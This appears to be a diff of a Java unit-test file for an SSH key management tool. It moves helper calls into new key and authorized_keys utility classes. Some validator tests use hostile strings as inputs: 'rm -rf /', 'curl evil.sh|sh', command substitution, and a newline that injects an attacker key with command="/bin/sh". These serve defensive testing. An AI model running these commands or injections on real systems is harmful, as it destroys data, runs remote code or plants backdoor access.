@@ -57,8 +57,8 @@ class SSHUtilTest {
 
             assertTrue(publicKey.startsWith("ssh-ed25519 "));
             assertDoesNotThrow(() -> SSHUtil.validateKeyPair(privateKey, publicKey, ""));
-            assertEquals("ED25519", SSHUtil.getKeyType(publicKey));
-            assertNotNull(SSHUtil.getFingerprint(publicKey));
+            assertEquals("ED25519", OpenSSHKeyUtil.getKeyType(publicKey));
+            assertNotNull(OpenSSHKeyUtil.getFingerprint(publicKey));
         } finally {
             SSHUtil.deleteGenSSHKeys();
         }
@@ -80,13 +80,13 @@ class SSHUtilTest {
         KeyPairGenerator kpg = KeyPairGenerator.getInstance("Ed25519");
         java.security.KeyPair kp = kpg.generateKeyPair();
 
-        String privatePem = SSHUtil.buildOpenSSHPrivateKey(kp, KeyPair.ED25519);
+        String privatePem = OpenSSHKeyUtil.buildOpenSSHPrivateKey(kp, KeyPair.ED25519);
 
-        byte[] encoded = SSHUtil.encodeSSHPublicKey("ssh-ed25519", kp.getPublic().getEncoded());
+        byte[] encoded = OpenSSHKeyUtil.encodeSSHPublicKey("ssh-ed25519", kp.getPublic().getEncoded());
         String publicKey = "ssh-ed25519 " + Base64.getEncoder().encodeToString(encoded) + " test@bastillion";
 
         assertDoesNotThrow(() -> SSHUtil.validateKeyPair(privatePem, publicKey, ""));
-        assertEquals("ED25519", SSHUtil.getKeyType(publicKey));
+        assertEquals("ED25519", OpenSSHKeyUtil.getKeyType(publicKey));
     }
 
     // --- rewrapWithOpenSSHKeygen: the passphrase the user chose must actually be applied ---
@@ -100,19 +100,19 @@ class SSHUtilTest {
         java.security.KeyPair kp = kpg.generateKeyPair();
 
         // buildOpenSSHPrivateKey writes "none" as the openssh-key-v1 cipher name.
-        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(SSHUtil.buildOpenSSHPrivateKey(kp, KeyPair.ED25519)));
+        assertFalse(OpenSSHKeyUtil.isEncryptedOpenSSHPrivateKey(OpenSSHKeyUtil.buildOpenSSHPrivateKey(kp, KeyPair.ED25519)));
     }
 
     @Test
     void isEncryptedOpenSSHPrivateKeyRejectsAnythingItCannotParse() {
-        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(null));
-        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(""));
-        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey("not a pem at all"));
+        assertFalse(OpenSSHKeyUtil.isEncryptedOpenSSHPrivateKey(null));
+        assertFalse(OpenSSHKeyUtil.isEncryptedOpenSSHPrivateKey(""));
+        assertFalse(OpenSSHKeyUtil.isEncryptedOpenSSHPrivateKey("not a pem at all"));
         // right envelope, unreadable contents - cannot prove encryption, so not encrypted
-        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(
+        assertFalse(OpenSSHKeyUtil.isEncryptedOpenSSHPrivateKey(
                 "-----BEGIN OPENSSH PRIVATE KEY-----\n####\n-----END OPENSSH PRIVATE KEY-----\n"));
         // valid base64, but not an openssh-key-v1 container
-        assertFalse(SSHUtil.isEncryptedOpenSSHPrivateKey(
+        assertFalse(OpenSSHKeyUtil.isEncryptedOpenSSHPrivateKey(
                 "-----BEGIN OPENSSH PRIVATE KEY-----\n"
                         + Base64.getEncoder().encodeToString("some other key format".getBytes())
                         + "\n-----END OPENSSH PRIVATE KEY-----\n"));
@@ -124,11 +124,11 @@ class SSHUtilTest {
 
         KeyPairGenerator kpg = KeyPairGenerator.getInstance("Ed25519");
         java.security.KeyPair kp = kpg.generateKeyPair();
-        String plain = SSHUtil.buildOpenSSHPrivateKey(kp, KeyPair.ED25519);
+        String plain = OpenSSHKeyUtil.buildOpenSSHPrivateKey(kp, KeyPair.ED25519);
 
-        String rewrapped = SSHUtil.rewrapWithOpenSSHKeygen("7", plain, "correct horse battery staple");
+        String rewrapped = OpenSSHKeyUtil.rewrapWithOpenSSHKeygen("7", plain, "correct horse battery staple");
 
-        assertTrue(SSHUtil.isEncryptedOpenSSHPrivateKey(rewrapped));
+        assertTrue(OpenSSHKeyUtil.isEncryptedOpenSSHPrivateKey(rewrapped));
         KeyPair loaded = KeyPair.load(new JSch(), rewrapped.getBytes(), null);
         assertTrue(loaded.isEncrypted());
         assertTrue(loaded.decrypt("correct horse battery staple"));
@@ -146,7 +146,7 @@ class SSHUtilTest {
         String notAKey = "-----BEGIN OPENSSH PRIVATE KEY-----\nnonsense\n-----END OPENSSH PRIVATE KEY-----\n";
 
         GeneralSecurityException ex = assertThrows(GeneralSecurityException.class,
-                () -> SSHUtil.rewrapWithOpenSSHKeygen("7", notAKey, "correct horse battery staple"));
+                () -> OpenSSHKeyUtil.rewrapWithOpenSSHKeygen("7", notAKey, "correct horse battery staple"));
 
         assertTrue(ex.getMessage().contains("ssh-keygen"), ex.getMessage());
     }
@@ -169,11 +169,11 @@ class SSHUtilTest {
         KeyPairGenerator kpg = KeyPairGenerator.getInstance("Ed25519");
         java.security.KeyPair kp = kpg.generateKeyPair();
 
-        // Each call salts its own random checksum (see SSHUtil.buildOpenSSHPrivateKey), so
+        // Each call salts its own random checksum (see OpenSSHKeyUtil.buildOpenSSHPrivateKey), so
         // the two PEMs won't be byte-identical - what must hold is that a blank passphrase
         // via the (userId, KeyPair, type, passphrase) overload still produces an
         // *unencrypted* key, same as the direct (KeyPair, type) call.
-        String viaOverload = SSHUtil.buildOpenSSHPrivateKey(42L, kp, KeyPair.ED25519, "");
+        String viaOverload = OpenSSHKeyUtil.buildOpenSSHPrivateKey(42L, kp, KeyPair.ED25519, "");
 
         KeyPair loaded = KeyPair.load(new JSch(), viaOverload.getBytes(), null);
         assertFalse(loaded.isEncrypted());
@@ -184,17 +184,17 @@ class SSHUtilTest {
 
     @Test
     void getKeyTypeRecognizesRsaAndEcdsaKeys() throws Exception {
-        assertEquals("RSA", SSHUtil.getKeyType(genJschPublicKey(KeyPair.RSA, 2048)));
-        assertEquals("ECDSA", SSHUtil.getKeyType(genJschPublicKey(KeyPair.ECDSA, 256)));
+        assertEquals("RSA", OpenSSHKeyUtil.getKeyType(genJschPublicKey(KeyPair.RSA, 2048)));
+        assertEquals("ECDSA", OpenSSHKeyUtil.getKeyType(genJschPublicKey(KeyPair.ECDSA, 256)));
     }
 
     @Test
     void getFingerprintIsStableForTheSameKeyAndDiffersAcrossKeys() throws Exception {
         String publicKey = genJschPublicKey(KeyPair.RSA, 2048);
 
-        String fingerprintA = SSHUtil.getFingerprint(publicKey);
-        String fingerprintB = SSHUtil.getFingerprint(publicKey);
-        String otherKeyFingerprint = SSHUtil.getFingerprint(genJschPublicKey(KeyPair.RSA, 2048));
+        String fingerprintA = OpenSSHKeyUtil.getFingerprint(publicKey);
+        String fingerprintB = OpenSSHKeyUtil.getFingerprint(publicKey);
+        String otherKeyFingerprint = OpenSSHKeyUtil.getFingerprint(genJschPublicKey(KeyPair.RSA, 2048));
 
         assertNotNull(fingerprintA);
         assertEquals(fingerprintA, fingerprintB);
@@ -345,17 +345,17 @@ class SSHUtilTest {
 
     @Test
     void appendKeyLineTerminatesTheFileSoTheNextAppendStartsItsOwnLine() {
-        assertEquals("existing-key\nnew-key\n", SSHUtil.appendKeyLine("existing-key\n", "new-key"));
+        assertEquals("existing-key\nnew-key\n", AuthorizedKeysUtil.appendKeyLine("existing-key\n", "new-key"));
     }
 
     @Test
     void appendKeyLineSeparatesFromAnExistingFileThatHasNoFinalNewline() {
-        assertEquals("existing-key\nnew-key\n", SSHUtil.appendKeyLine("existing-key", "new-key"));
+        assertEquals("existing-key\nnew-key\n", AuthorizedKeysUtil.appendKeyLine("existing-key", "new-key"));
     }
 
     @Test
     void appendKeyLineAddsNoBlankFirstLineWhenThereIsNoFileYet() {
-        assertEquals("new-key\n", SSHUtil.appendKeyLine("", "new-key"));
+        assertEquals("new-key\n", AuthorizedKeysUtil.appendKeyLine("", "new-key"));
     }
 
     // --- isSafeAuthorizedKeysPath / isSafeKeyContent: originally guards against shell
@@ -367,30 +367,30 @@ class SSHUtilTest {
 
     @Test
     void isSafeAuthorizedKeysPathAcceptsOrdinaryPaths() {
-        assertTrue(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys"));
-        assertTrue(SSHUtil.isSafeAuthorizedKeysPath("/home/deploy/.ssh/authorized_keys"));
-        assertTrue(SSHUtil.isSafeAuthorizedKeysPath("some-dir_2/authorized_keys"));
+        assertTrue(AuthorizedKeysUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys"));
+        assertTrue(AuthorizedKeysUtil.isSafeAuthorizedKeysPath("/home/deploy/.ssh/authorized_keys"));
+        assertTrue(AuthorizedKeysUtil.isSafeAuthorizedKeysPath("some-dir_2/authorized_keys"));
     }
 
     @Test
     void isSafeAuthorizedKeysPathRejectsShellMetacharacters() {
-        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys; rm -rf /"));
-        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys && curl evil.sh|sh"));
-        assertFalse(SSHUtil.isSafeAuthorizedKeysPath("$(whoami)"));
-        assertFalse(SSHUtil.isSafeAuthorizedKeysPath("`whoami`"));
-        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys\nrm -rf /"));
-        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(".ssh/authorized keys"));
+        assertFalse(AuthorizedKeysUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys; rm -rf /"));
+        assertFalse(AuthorizedKeysUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys && curl evil.sh|sh"));
+        assertFalse(AuthorizedKeysUtil.isSafeAuthorizedKeysPath("$(whoami)"));
+        assertFalse(AuthorizedKeysUtil.isSafeAuthorizedKeysPath("`whoami`"));
+        assertFalse(AuthorizedKeysUtil.isSafeAuthorizedKeysPath(".ssh/authorized_keys\nrm -rf /"));
+        assertFalse(AuthorizedKeysUtil.isSafeAuthorizedKeysPath(".ssh/authorized keys"));
     }
 
     @Test
     void isSafeAuthorizedKeysPathRejectsBlank() {
-        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(""));
-        assertFalse(SSHUtil.isSafeAuthorizedKeysPath(null));
+        assertFalse(AuthorizedKeysUtil.isSafeAuthorizedKeysPath(""));
+        assertFalse(AuthorizedKeysUtil.isSafeAuthorizedKeysPath(null));
     }
 
     @Test
     void isSafeKeyContentAcceptsOrdinaryPublicKeyLines() {
-        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA test@bastillion"));
+        assertTrue(AuthorizedKeysUtil.isSafeKeyContent("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA test@bastillion"));
     }
 
     @Test
@@ -398,31 +398,31 @@ class SSHUtilTest {
         // Ordinary in a comment, and harmless now that authorized_keys is written over SFTP
         // rather than through echo '...'. Rejecting it dropped the key from the file and told
         // the user nothing.
-        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... alice's laptop"));
+        assertTrue(AuthorizedKeysUtil.isSafeKeyContent("ssh-ed25519 AAAA... alice's laptop"));
     }
 
     @Test
     void isSafeKeyContentRejectsLineBreaksThatWouldAppendASecondEntry() {
         // The real risk: a key comment that splits the line gets its own authorized_keys
         // entry, with its own options.
-        assertFalse(SSHUtil.isSafeKeyContent(
+        assertFalse(AuthorizedKeysUtil.isSafeKeyContent(
                 "ssh-ed25519 AAAA... x\ncommand=\"/bin/sh\" ssh-ed25519 AAAA... attacker"));
-        assertFalse(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... x\r\nssh-ed25519 BBBB... attacker"));
+        assertFalse(AuthorizedKeysUtil.isSafeKeyContent("ssh-ed25519 AAAA... x\r\nssh-ed25519 BBBB... attacker"));
     }
 
     @Test
     void isSafeKeyContentAcceptsShellMetacharactersBecauseNoShellSeesThem() {
         // addPubKey reads and writes authorized_keys over SFTP, so none of these can do
         // anything. Keeping them out only cost users their access, silently.
-        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... $(whoami)"));
-        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test; rm -rf /"));
-        assertTrue(SSHUtil.isSafeKeyContent("ssh-ed25519 AAAA... test\"quoted\""));
+        assertTrue(AuthorizedKeysUtil.isSafeKeyContent("ssh-ed25519 AAAA... $(whoami)"));
+        assertTrue(AuthorizedKeysUtil.isSafeKeyContent("ssh-ed25519 AAAA... test; rm -rf /"));
+        assertTrue(AuthorizedKeysUtil.isSafeKeyContent("ssh-ed25519 AAAA... test\"quoted\""));
     }
 
     @Test
     void isSafeKeyContentRejectsBlank() {
-        assertFalse(SSHUtil.isSafeKeyContent(""));
-        assertFalse(SSHUtil.isSafeKeyContent(null));
+        assertFalse(AuthorizedKeysUtil.isSafeKeyContent(""));
+        assertFalse(AuthorizedKeysUtil.isSafeKeyContent(null));
     }
 
     // --- reserveNextInstanceId: the fix for the "duplicate session" terminal-output regression ---
